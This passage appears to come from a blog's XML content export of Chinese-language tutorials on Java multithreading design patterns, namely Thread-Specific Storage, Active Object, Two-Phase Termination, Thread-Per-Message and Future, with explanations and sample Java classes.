<h3 id="Log类"><a href="#Log类" class="headerlink" title="Log类"></a>Log类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Log</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;TSLog&gt; tsLogCollection = <span class="keyword">new</span> ThreadLocal&lt;&gt;();</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">println</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		getTSLog().println(s);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		getTSLog().close();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> TSLog <span class="title">getTSLog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		TSLog tsLog = tsLogCollection.get();</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">null</span> == tsLog) &#123;</span><br><span class="line">			tsLog = <span class="keyword">new</span> TSLog(Thread.currentThread().getName() + <span class="string">"-log.txt"</span>);</span><br><span class="line">			tsLogCollection.set(tsLog);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> tsLog;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ClientThread类"><a href="#ClientThread类" class="headerlink" title="ClientThread类"></a>ClientThread类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClientThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">ClientThread</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(name);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(getName() + <span class="string">" Begin"</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">10</span>;i++) &#123;</span><br><span class="line">			Log.println(<span class="string">"i = "</span> + i);</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				Thread.sleep(<span class="number">100</span>);</span><br><span class="line">			&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">				<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		Log.close();</span><br><span class="line">		System.out.println(getName() + <span class="string">" End"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Main类"><a href="#Main类" class="headerlink" title="Main类"></a>Main类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">new</span> ClientThread(<span class="string">"A"</span>).start();</span><br><span class="line">		<span class="keyword">new</span> ClientThread(<span class="string">"B"</span>).start();</span><br><span class="line">		<span class="keyword">new</span> ClientThread(<span class="string">"C"</span>).start();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>java多线程设计模式</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>多线程</tag>
        <tag>设计模式</tag>
        <tag>Thread-Specific-Storage模式</tag>
      </tags>
  </entry>
  <entry>
    <title>Active Object模式</title>
    <url>/2018/10/26/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/12.Active%20Object/</url>
    <content><![CDATA[<h2 id="Active-Object模式"><a href="#Active-Object模式" class="headerlink" title="Active Object模式"></a>Active Object模式</h2><p>Active是“主动的”意思，因此Active Object就是“主动对象”的意思。所谓的“主动的”，一般指“有自己特有的线程”。因此，举例来说，Java的java.lang.Thread类的实例就是一种主动对象。</p>
<p>不过，在Active Object模式中出厂的主动对象可不仅仅“有自己特有的线程”。它同时还具有可以从外部接受和处理异步消息并根据需要返回处理结果的特征。</p>
<p>Active Object模式中的主动对象会通过自己特有的线程在适合的时机处理从外部接受到的异步消息。</p>
<p>在Active Object模式中，组成主动对象与许多自然人组成法人类似。及时是Java语言这种没有异步消息的编程语言，也可以使用Active Object模式组成实际上能够处理异步消息的主动对象。</p>
<h3 id="类的一览表"><a href="#类的一览表" class="headerlink" title="类的一览表"></a>类的一览表</h3><p>主动对象由ActiveObjectFactory类创建，实现了ActiveObject接口。使用主动对象的线程时MakerClientThread类和DisplayClientThread类。这些线程会各自向主动对象发送异步的“生成字符串”和“显示字符串”的请求。<br>| 包 | 名字 | 说明  |<br>| —- | —- | —- |<br>| 无名 | Main | 测试程序行为的类 |<br>| 无名 | MakerClientThread | 发出“生成字符串”请求的线程 |<br>| activeObject  | DisplayClientThread | 发出“显示字符串”请求的线程 |<br>| activeObject  | ActiveObject | 定义“主动对象”的接口（API）的接口 |<br>| activeObject  | ActiveObjectFactory | 创建“主动对象”的类 |<br>| activeObject  | Proxy | 将方法调用转换为MethodRequest对象的类（实现了ActiveObject的接口） |<br>| activeObject  | SchedulerThread | 调用ececute方法处理MethodRequest对象的类 |<br>| activeObject  | ActivationQueue | 按顺序保存MethodRequest对象的类 |<br>| activeObject  | MethodRequest | 表示请求的抽象类 |<br>| activeObject  | MakeStringRequest | makeString方法（生成字符串）对应的类。MethodRequest的子类 |<br>| activeObject  | DisplayStringRequest | displayString方法（显示字符串）对应的类。MethodRequest的子类 |<br>| activeObject  | Result | 表示执行结果的抽象类 |<br>| activeObject  | FutureResult | 在Future模式中表示执行结果的类 |<br>| activeObject  | RealResult | 表示实际的执行结果的类 |<br>| activeObject  | Servant | 执行实际处理的类（实现了ActiveObject接口） |</p>
<h3 id="调用方：MakerClientThread类"><a href="#调用方：MakerClientThread类" class="headerlink" title="调用方：MakerClientThread类"></a>调用方：MakerClientThread类</h3><p>MakerClientThread类是调用主动对象的makeString方法（生成字符串）的线程。</p>
<p>activeObject字段中保存的是ActiveObject对象。MakerClientThread类会调用该对象的makeString方法。</p>
<p>makeString方法会在被调用后立即返回。这里的调用相当于将“生成字符串”这个异步消息传递给主动对象。</p>
<p>虽然makeString的返回值是Result类型，但是实际上这里使用的是Future模式。使用getResultValue方法可以获取实际的返回值。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MakerClientThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> ActiveObject activeObject;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">char</span> fillChar;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">MakerClientThread</span><span class="params">(String name, ActiveObject activeObject)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(name);</span><br><span class="line">		<span class="keyword">this</span>.activeObject = activeObject;</span><br><span class="line">		<span class="keyword">this</span>.fillChar = name.charAt(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;<span class="keyword">true</span>;i++) &#123;</span><br><span class="line">				Result&lt;String&gt; result = activeObject.makeString(i, fillChar);</span><br><span class="line">				Thread.sleep(<span class="number">10</span>);</span><br><span class="line">				String value = result.getResultValue();</span><br><span class="line">				System.out.println(Thread.currentThread().getName() + <span class="string">": value = "</span> + value);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			System.out.println(e.getMessage());</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="调用方："><a href="#调用方：" class="headerlink" title="调用方："></a>调用方：</h3>]]></content>
      <categories>
        <category>java多线程设计模式</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>多线程</tag>
        <tag>设计模式</tag>
        <tag>Active Object模式</tag>
      </tags>
  </entry>
  <entry>
    <title>Two-Phase-Termination模式</title>
    <url>/2018/10/14/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/10.Two-Phase-Termination/</url>
    <content><![CDATA[<h2 id="Two-Phase-Termination模式"><a href="#Two-Phase-Termination模式" class="headerlink" title="Two-Phase-Termination模式"></a>Two-Phase-Termination模式</h2><p>该模式的名字直译为中文是“分两段终止”的意思。它是一种先执行完终止处理再终止线程的模式。</p>
<p>我们称线程在进行正常处理时的状态为“操作中”。在要停止该线程时，我们会发出“终止请求”。这样，线程就不会突然终止，而是会先开始进行“打扫工作”。我们称这种状态为“终止处理中”。从“操作中”变为“终止处理中”是线程终止的第一阶段。</p>
<p>在“终止处理中”状态下，线程不会再进行正常操作了。它虽然仍然在运行，但是只会进行终止处理。终止处理完成后，就会真正地终止线程。“终止处理中”状态结束时线程终止的第二阶段。</p>
<p>先从“操作中”变为“终止处理中”状态，然后再真正地终止线程。</p>
<p>该模式的要点如下：</p>
<ol>
<li>安全地终止线程（安全性）</li>
<li>必定会进行终止处理（生存型）</li>
<li>发出终止请求后尽快进行终止处理（响应性）</li>
</ol>
<h2 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h2><h3 id="类的一览表"><a href="#类的一览表" class="headerlink" title="类的一览表"></a>类的一览表</h3><table>
<thead>
<tr>
<th>名字</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>CountupThread</td>
<td>表示进行计数的线程的类。</td>
</tr>
<tr>
<td>Main</td>
<td>测试程序行为的类</td>
</tr>
</tbody></table>
<h3 id="CountupThread类"><a href="#CountupThread类" class="headerlink" title="CountupThread类"></a>CountupThread类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CountupThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">long</span> counter = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">boolean</span> shudownRequested = <span class="keyword">false</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shutdownRequest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		shudownRequested = <span class="keyword">true</span>;</span><br><span class="line">		interrupt();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isShutdownRequested</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> shudownRequested;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">while</span> (!isShutdownRequested()) &#123;</span><br><span class="line">				doWork();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">			doShutdown();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">doWork</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">		counter++;</span><br><span class="line">		System.out.println(<span class="string">"DoWork: counter = "</span> + counter);</span><br><span class="line">		Thread.sleep(<span class="number">500</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">doShutdown</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"Do shutdown : counter = "</span> + counter);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Main类"><a href="#Main类" class="headerlink" title="Main类"></a>Main类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"Main begin"</span>);</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			CountupThread t = <span class="keyword">new</span> CountupThread();</span><br><span class="line">			t.start();</span><br><span class="line">			Thread.sleep(<span class="number">10000</span>);</span><br><span class="line">			</span><br><span class="line">			System.out.println(<span class="string">"Main shutdown request"</span>);</span><br><span class="line">			t.shutdownRequest();</span><br><span class="line">			System.out.println(<span class="string">"main join"</span>);</span><br><span class="line">			t.join();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(<span class="string">"Main end"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>java多线程设计模式</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>多线程</tag>
        <tag>设计模式</tag>
        <tag>Two-Phase-Termination模式</tag>
      </tags>
  </entry>
  <entry>
    <title>Thread-Per-Message模式</title>
    <url>/2018/10/14/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/7.Thread-Per-Message%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="Thread-Per-Message-模式"><a href="#Thread-Per-Message-模式" class="headerlink" title="Thread-Per-Message 模式"></a>Thread-Per-Message 模式</h2><p>所谓Per，就是“每~”的意思。因此，Thread-Per-Message直译过来就是“每个消息一个线程”的意思。Message在这里可以理解为“命令”或“请求”。为每个命令或请求新分配一个线程，由这个线程来执行处理。</p>
<p>在Thread-Per-Message 模式中，消息的“委托端”和“执行端”是不同的线程。消息的委托端线程会告诉执行端线程“这项工作就交给你了”。</p>
<h2 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h2><p>在示例程序中，Main类委托Host类来显示字符。Host类会创建并启动一个线程，来处理该委托。启动的线程使用Helper类来执行实际的显示。</p>
<h3 id="类的一览表"><a href="#类的一览表" class="headerlink" title="类的一览表"></a>类的一览表</h3><table>
<thead>
<tr>
<th>名字</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Main</td>
<td>向Host发送字符显示请求的类</td>
</tr>
<tr>
<td>Host</td>
<td>针对请求创建线程的类</td>
</tr>
<tr>
<td>Helper</td>
<td>提供字符显示功能的被动类</td>
</tr>
</tbody></table>
<h3 id="Main类"><a href="#Main类" class="headerlink" title="Main类"></a>Main类</h3><p>Main类会先创建一个Host类的实例，然后调用Host的request方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"Main begin"</span>);</span><br><span class="line">		Host host = <span class="keyword">new</span> Host();</span><br><span class="line">		host.request(<span class="number">10</span>, <span class="string">'A'</span>);</span><br><span class="line">		host.request(<span class="number">20</span>, <span class="string">'B'</span>);</span><br><span class="line">		host.request(<span class="number">30</span>, <span class="string">'C'</span>);</span><br><span class="line">		System.out.println(<span class="string">"Main end"</span>);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Host类"><a href="#Host类" class="headerlink" title="Host类"></a>Host类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Host</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Helper helper = <span class="keyword">new</span> Helper();</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">request</span><span class="params">(<span class="keyword">final</span> <span class="keyword">int</span> count, <span class="keyword">final</span> <span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"        request("</span> + count + <span class="string">", "</span> + c + <span class="string">") begin"</span>);</span><br><span class="line">		<span class="keyword">new</span> Thread() &#123;</span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">				helper.handle(count, c);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;.start();</span><br><span class="line">		System.out.println(<span class="string">"        request("</span> + count + <span class="string">", "</span> + c + <span class="string">") end"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Helper类"><a href="#Helper类" class="headerlink" title="Helper类"></a>Helper类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handle</span> <span class="params">(<span class="keyword">int</span> count, <span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"        handle("</span> + count + <span class="string">", "</span> + c + <span class="string">") begin"</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; count;i++) &#123;</span><br><span class="line">			slowly();</span><br><span class="line">			System.out.println(c);</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(<span class="string">""</span>);</span><br><span class="line">		System.out.println(<span class="string">"        handle("</span> + count + <span class="string">", "</span> + c + <span class="string">") end"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">slowly</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			Thread.sleep(<span class="number">100</span>);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>java多线程设计模式</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>多线程</tag>
        <tag>设计模式</tag>
        <tag>Thread-Per-Message 模式</tag>
      </tags>
  </entry>
  <entry>
    <title>Future模式</title>
    <url>/2018/10/14/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/9.Future%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="Future模式"><a href="#Future模式" class="headerlink" title="Future模式"></a>Future模式</h2><p>Future的意思就是未来、期货（经济学）用语。假设有一个方法需要花费很长时间才能获取运行结果。那么与其一直等待结果，不如先拿一张“提货单”。获取提货单并不耗费时间。这里的“提货单”就称之为Future角色。</p>
<p>获取Future劫色的线程会在稍后使用Future觉得来获取运行结果。这与凭着提货单去取蛋糕非常相似。如果运行结果已经出来了，那么直接领取即可；如果运行结果还没有出来，那么需要等待结果出来。</p>
<h2 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h2><p>在Future模式中，程序一旦发出请求，就会立即获取返回值。也就是说，会有下面这样的返回值。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Data data = host.request(<span class="number">10</span>, <span class="string">'A'</span>);</span><br></pre></td></tr></table></figure>
<p>但是，这里的返回值data并非请求的运行结果。为了获取请求的运行结果，我们刚刚启动了其他线程去计算。也就是说，这个返回值并不是蛋糕自身，而是蛋糕的提货单。</p>
<p>如下所示，过了一段时间之后，线程会先用data的getContent方法取获取运行结果。</p>
<p>这相当于使用提货单提取我们订购的蛋糕。如果其他线程处理完了请求，那么调用getContent的线程会立即从该方法返回；而如果其他线程还没有处理完请求，那么调用getContent的线程，则会继续等待运行结果。</p>
<h3 id="类的一览表"><a href="#类的一览表" class="headerlink" title="类的一览表"></a>类的一览表</h3><table>
<thead>
<tr>
<th>名字</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Main</td>
<td>向Host发出请求并获取数据的类</td>
</tr>
<tr>
<td>Host</td>
<td>向请求返回FutureData的实例的类</td>
</tr>
<tr>
<td>Data</td>
<td>表示访问数据的方法的接口。由FutureData和RealData实现该接口。</td>
</tr>
<tr>
<td>FutureData</td>
<td>表示RealData的“提货单”的类。其他线程会创建RealData的实例。</td>
</tr>
<tr>
<td>RealData</td>
<td>表示实际数据的类。构造函数的处理会花费很长的时间。</td>
</tr>
</tbody></table>
<h3 id="Main类"><a href="#Main类" class="headerlink" title="Main类"></a>Main类</h3><p>Main类会调用request方法三次。接着它会接受三个Data（data1、data2、data3）作为返回值。这三个返回值实际上都是FutureData的实例，无需花费时间即可获取它们，类似蛋糕的提货单。因此，这相当于获取了三张提货单。</p>
<p>然后，为了表示Main类取执行了其他操作，我们让其sleep大约2秒。接下来，分别调用之前接收到的返回值data1、data2和data3的getContent方法来获取真正希望获取的结果。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"Main Begin"</span>);</span><br><span class="line">		</span><br><span class="line">		Host host = <span class="keyword">new</span> Host();</span><br><span class="line">		Data data1 = host.request(<span class="number">10</span>, <span class="string">'A'</span>);</span><br><span class="line">		Data data2 = host.request(<span class="number">20</span>, <span class="string">'B'</span>);</span><br><span class="line">		Data data3 = host.request(<span class="number">30</span>, <span class="string">'C'</span>);</span><br><span class="line">		</span><br><span class="line">		System.out.println(<span class="string">"Main Other Job Begin"</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		System.out.println(<span class="string">"data1 = "</span> + data1.getContent());</span><br><span class="line">		System.out.println(<span class="string">"data3 = "</span> + data3.getContent());</span><br><span class="line">		System.out.println(<span class="string">"data2 = "</span> + data2.getContent());</span><br><span class="line">		System.out.println(<span class="string">"Main End"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Host类"><a href="#Host类" class="headerlink" title="Host类"></a>Host类</h3><p>Host类首先会创建FutureData的实例。这并不会耗费很长时间。该实例会被作为返回值返回给调用者。</p>
<p>接着，它会启动一个新的线程并在新线程中创建RealData实例。虽然创建RealData的实例需要花费很长的时间，但这是在新线程中进行的，并不会影响Main类的线程的处理。</p>
<p>新线程会努力地创建RealData实例。当realData创建完成后，线程会调用setReadData方法将其设置到future字段中。由于创建realData会花费一些时间，所以设置future字段就是稍后的事情了。</p>
<p>接着调用了request方法的线程会在新线程启动后拿到返回值future并立即返回。</p>
<p>总结起来，执行request的线程会做以下三件事：</p>
<ol>
<li>创建FutureData的实例</li>
<li>启动一个新线程，用于创建RealData</li>
<li>将FutureData的实例作为返回值返回给调用者。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Host</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> Data <span class="title">request</span><span class="params">(<span class="keyword">final</span> <span class="keyword">int</span> count, <span class="keyword">final</span> <span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"    request("</span> + count + <span class="string">", "</span> + c + <span class="string">") BEGIN"</span>);</span><br><span class="line">		<span class="keyword">final</span> FutureData future = <span class="keyword">new</span> FutureData();</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">new</span> Thread() &#123;</span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">				RealData realData = <span class="keyword">new</span> RealData(count, c);</span><br><span class="line">				future.setRealData(realData);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;.start();</span><br><span class="line">		System.out.println(<span class="string">"    request("</span> + count + <span class="string">", "</span> + c + <span class="string">") END"</span>);</span><br><span class="line">		<span class="keyword">return</span> future;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="Data接口"><a href="#Data接口" class="headerlink" title="Data接口"></a>Data接口</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Data</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title">getContent</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="FutureData类"><a href="#FutureData类" class="headerlink" title="FutureData类"></a>FutureData类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FutureData</span> <span class="keyword">implements</span> <span class="title">Data</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> RealData realData = <span class="keyword">null</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">boolean</span> ready = <span class="keyword">false</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">setRealData</span><span class="params">(RealData realData)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (ready) &#123;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">this</span>.realData = realData;</span><br><span class="line">		<span class="keyword">this</span>.ready = <span class="keyword">true</span>;</span><br><span class="line">		notifyAll();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> String <span class="title">getContent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">while</span> (!ready) &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				wait();</span><br><span class="line">			&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> realData.getContent();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="RealData类"><a href="#RealData类" class="headerlink" title="RealData类"></a>RealData类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RealData</span> <span class="keyword">implements</span> <span class="title">Data</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> String content;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">RealData</span><span class="params">(<span class="keyword">int</span> count, <span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"    making RealData("</span> + count + <span class="string">", "</span> + c + <span class="string">") BEGIN"</span>);</span><br><span class="line">		<span class="keyword">char</span>[] buffer = <span class="keyword">new</span> <span class="keyword">char</span>[count];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; count;i++) &#123;</span><br><span class="line">			buffer[i] = c;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				Thread.sleep(<span class="number">100</span>);</span><br><span class="line">			&#125; <span 